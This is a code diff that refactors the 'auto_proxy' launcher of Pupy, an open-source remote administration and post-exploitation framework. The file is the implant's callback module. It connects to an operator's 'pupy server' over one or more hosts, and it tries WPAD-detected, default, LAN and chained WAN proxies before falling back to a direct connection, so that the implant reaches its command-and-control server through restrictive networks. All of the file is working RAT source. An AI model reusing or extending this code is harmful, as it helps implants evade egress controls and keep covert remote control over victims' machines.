@@ -1,205 +1,143 @@
 # -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
-# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
+# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root
+# of the project for the detailed licence terms
 
 __all__ = ['AutoProxyLauncher']
 
 import argparse
 
-from network.lib import utils
+from network.lib.utils import (
+    parse_transports_args,
+    create_client_transport_info_for_addr,
+    parse_host
+)
 
-from ..base_launcher import BaseLauncher, LauncherArgumentParser, LauncherError
-from ..clients import PupyTCPClient, PupySSLClient, PupyProxifiedTCPClient, PupyProxifiedSSLClient
-from ..proxies import get_proxies, find_default_proxy, get_proxy_for_address
+from network.lib.base_launcher import (
+    BaseLauncher, LauncherArgumentParser, LauncherError
+)
 
-import logging
+from network.lib.proxies import (
+    find_proxies_for_transport, connect_client_with_proxy_info
+)
 
-logger = logging.getLogger('pupy.network.auto_proxy')
+from network.lib.socks import ProxyError
 
-def find_proxies(additional_proxies=None, url=None):
-    wpad_proxies = get_proxy_for_address(url)
-    logger.info('URL: %s WPAD: %s ADDITIONAL: %s', url, wpad_proxies, additional_proxies)
+from . import getLogger
 
-    if wpad_proxies:
-        logger.info('WPAD for %s: %s', url, wpad_proxies)
-        for proxy_info in wpad_proxies:
-            yield proxy_info
-
-    proxy_info = find_default_proxy()
-    if proxy_info:
-        yield proxy_info
-
-    for proxy_info in get_proxies(additional_proxies=additional_proxies):
-        if proxy_info:
-            yield proxy_info
+logger = getLogger('auto_proxy')
 
 class AutoProxyLauncher(BaseLauncher):
-    """
-        Automatically search a HTTP/SOCKS proxy on the system and use that proxy with the specified TCP transport.
-        Also try without proxy if none of them are available/working
-    """
+    '''
+    Communicate to server via proxy or chain of proxies
+    '''
+
+    credentials = ['SSL_BIND_CERT']
 
     __slots__ = (
-        'arg_parser', 'args', 'rhost', 'rport', 'connect_on_bind_payload'
+        'arg_parser', 'args', 'hosts',
+        'connect_on_bind_payload', 'opt_args'
     )
 
     def __init__(self, *args, **kwargs):
+        self.connect_on_bind_payload = kwargs.pop('connect_on_bind_payload', False)
         super(AutoProxyLauncher, self).__init__(*args, **kwargs)
 
     @classmethod
     def init_argparse(cls):
         cls.arg_parser = LauncherArgumentParser(prog="auto_proxy", description=cls.__doc__)
-        cls.arg_parser.add_argument('--host', metavar='<host:port>', required=True, help='host:port of the pupy server to connect to')
-        cls.arg_parser.add_argument('-t', '--transport', choices=cls.transports, default="ssl", help="the transport to use ! (the server needs to be configured with the same transport) ")
-        cls.arg_parser.add_argument('--add-proxy', action='append', help=" add a hardcoded proxy TYPE:address:port ex: SOCKS5:127.0.0.1:1080")
-        cls.arg_parser.add_argument('--no-direct', action='store_true', help="do not attempt to connect without a proxy")
-        cls.arg_parser.add_argument('transport_args', nargs=argparse.REMAINDER, help="change some transport arguments ex: param1=value param2=value ...")
+        cls.arg_parser.add_argument(
+            '-c', '--host', metavar='<host:port>', required=True, action='append',
+            help='host:port of the pupy server to connect to. You can provide multiple '
+            '--host arguments to attempt to connect to multiple IPs')
+        cls.arg_parser.add_argument(
+            '-t', '--transport', choices=cls.transports, default='ssl',
+            help='The transport to use')
+        cls.arg_parser.add_argument(
+            '-P', '--no-wpad', action='store_true', default=False,
+            help='Disable WPAD autodetection')
+        cls.arg_parser.add_argument(
+            '-A', '--no-auto', action='store_true', default=False,
+            help='Disable automatic search for proxies')
+        cls.arg_parser.add_argument(
+            '-D', '--no-direct', action='store_true', default=False,
+            help='Do not attempt to connect without a proxy')
+        cls.arg_parser.add_argument(
+            '-L', '--try-lan-proxy', action='append',
+            help='Try to communicate with WAN using sepcified proxy: '
+            'TYPE:host:port (SOCKS5:192.168.0.1:1080)')
+        cls.arg_parser.add_argument(
+            '-W', '--add-wan-proxy', action='append',
+            help='Add proxy to chain of proxies to communicate with pupy server: '
+            'TYPE:host:port (SOCKS5:192.168.0.1:1080)')
+        cls.arg_parser.add_argument(
+            'transport_args', nargs=argparse.REMAINDER,
+            help='Transport arguments: key=value key=value ...')
 
     def parse_args(self, args):
-        self.args=self.arg_parser.parse_args(args)
-        self.rhost, self.rport=None,None
-        tab=self.args.host.rsplit(":",1)
-        self.rhost=tab[0]
-        if len(tab)==2:
-            self.rport=int(tab[1])
-        else:
-            self.rport=443
-        self.set_host("%s:%s"%(self.rhost, self.rport))
+        super(AutoProxyLauncher, self).parse_args(args)
+
         self.set_transport(self.args.transport)
+        self.opt_args = parse_transports_args(self.args.transport_args)
+        self.hosts = [
+            parse_host(host) for host in self.args.host
+        ]
+
+    def connect_to_host(self, host_info):
+        logger.info('connecting to %s:%d using transport %s ...',
+            host_info.host, host_info.port, self.args.transport)
+
+        transport_info = create_client_transport_info_for_addr(
+            self.args.transport, host_info,
+            self.opt_args, self.connect_on_bind_payload
+        )
+
+        logger.info('using client options: %s', transport_info.client_args)
+        logger.info('using transports options: %s', transport_info.transport_args)
+
+        proposed_proxy_infos = find_proxies_for_transport(
+            transport_info, host_info,
+            lan_proxies=self.args.try_lan_proxy,
+            wan_proxies=self.args.add_wan_proxy,
+            auto=not self.args.no_auto,
+            wpad=not self.args.no_wpad,
+            direct=not self.args.no_direct
+        )
+
+        for proxy_info in proposed_proxy_infos:
+            try:
+                yield connect_client_with_proxy_info(
+                    transport_info, proxy_info)
+
+            except (ProxyError, EOFError) as e:
+                logger.info(
+                    'Connection to %s:%d using %s failed: %s',
+                    host_info.host, host_info.port, proxy_info.chain, e
+                )
+            except Exception as e:
+                logger.exception(e)
 
     def iterate(self):
         if self.args is None:
-            raise LauncherError("parse_args needs to be called before iterate")
+            raise LauncherError('parse_args needs to be called before iterate')
 
-        opt_args = utils.parse_transports_args(' '.join(self.args.transport_args))
+        for host_info in self.hosts:
+            streams_iterator = self.connect_to_host(host_info)
+            self.set_host((host_info.host, host_info.port))
 
-        # Try to find/use proxies
-        for proxy_type, proxy, proxy_username, proxy_password in find_proxies(
-                additional_proxies=self.args.add_proxy, url='{host}:{port}'.format(
-                    host=self.rhost, port=self.rport)):
-            try:
-                t = self.transports[self.args.transport]()
-                client_args = {
-                    k:v for k,v in t.client_kwargs.iteritems()
-                }
-
-                transport_args = {
-                    k:v for k,v in t.client_transport_kwargs.iteritems()
-                }
-
-                if 'host' not in opt_args:
-                    transport_args['host'] = '{}{}'.format(
-                        self.rhost, ':{}'.format(self.rport) if self.rport != 80 else ''
-                    )
-
-                for val in opt_args:
-                    if val.lower() in t.client_transport_kwargs:
-                        transport_args[val.lower()]=opt_args[val]
-                    else:
-                        client_args[val.lower()]=opt_args[val]
-
-                transport_args['proxy'] = True
-                if proxy_password or proxy_username:
-                    transport_args['auth'] = (proxy_username, proxy_password)
-
-                transport_args['connect'] = self.rhost, self.rport
-
-                proxy_addr, proxy_port = proxy.split(':')
-                proxy_port = int(proxy_port)
-
-                chost, cport = proxy_addr, proxy_port
-
-                if proxy_type not in t.internal_proxy_impl:
-                    if t.client is PupyTCPClient:
-                        t.client=PupyProxifiedTCPClient
-                    elif t.client is PupySSLClient:
-                        t.client=PupyProxifiedSSLClient
-                    else:
-                        raise SystemExit("proxyfication for client %s is not implemented"%str(t.client))
-
-                    client_args.update({
-                        'proxy_type': proxy_type.upper(),
-                        'proxy_addr': proxy_addr,
-                        'proxy_port': proxy_port,
-                        'proxy_username': proxy_username,
-                        'proxy_password': proxy_password
-                    })
-
-                    chost, cport = self.rhost, self.rport
-
-                logger.info("using client options: %s"%client_args)
-                logger.info("using transports options: %s"%transport_args)
-
+            while True:
                 try:
-                    t.parse_args(transport_args)
+                    stream = next(streams_iterator)
+                    yield stream
+                    if not stream.failed:
+                        logger.info('Successful attempt')
+                        break
+
+                except EOFError as e:
+                    logger.info('Connection closed: %s', e)
+
+                except StopIteration:
+                    break
+
                 except Exception as e:
-                    #at this point we quit if we can't instanciate the client
-                    raise SystemExit(e)
-                try:
-                    client = t.client(**client_args)
-                except Exception as e:
-                    #at this point we quit if we can't instanciate the client
-                    raise SystemExit(e)
-
-                logger.info("connecting to %s:%s using transport %s and %s proxy %s:%s ..."%(
-                    self.rhost, self.rport, self.args.transport, proxy_type, proxy_addr, proxy_port)
-                )
-
-                s = client.connect(chost, cport)
-                stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
-                yield stream
-
-            except StopIteration:
-                raise
-
-            except Exception as e:
-                logger.error(e)
-
-        # Try without any proxy
-        if not self.args.no_direct:
-            try:
-                t = self.transports[self.args.transport]()
-
-                client_args = {
-                    k:v for k,v in t.client_kwargs.iteritems()
-                }
-
-                transport_args = {
-                    k:v for k,v in t.client_transport_kwargs.iteritems()
-                }
-
-                if 'host' not in opt_args:
-                    transport_args['host'] = '{}{}'.format(
-                        self.rhost, ':{}'.format(self.rport) if self.rport != 80 else ''
-                    )
-
-                for val in opt_args:
-                    if val.lower() in t.client_kwargs:
-                        client_args[val.lower()]=opt_args[val]
-                    elif val.lower() in t.client_transport_kwargs:
-                        transport_args[val.lower()]=opt_args[val]
-                    else:
-                        logger.warning("unknown transport argument : %s"%val)
-
-                logger.info("using client options: %s"%client_args)
-                logger.info("using transports options: %s"%transport_args)
-                try:
-                    t.parse_args(transport_args)
-                except Exception as e:
-                    #at this point we quit if we can't instanciate the client
-                    raise SystemExit(e)
-                try:
-                    client=t.client(**client_args)
-                except Exception as e:
-                    #at this point we quit if we can't instanciate the client
-                    raise SystemExit(e)
-                logger.info("connecting to %s:%s using transport %s without any proxy ..."%(
-                    self.rhost, self.rport, self.args.transport)
-                )
-                s=client.connect(self.rhost, self.rport)
-                stream = t.stream(s, t.client_transport, transport_args)
-                yield stream
-            except StopIteration:
-                raise
-            except Exception as e:
-                logger.error(e)
+                    logger.exception(e)
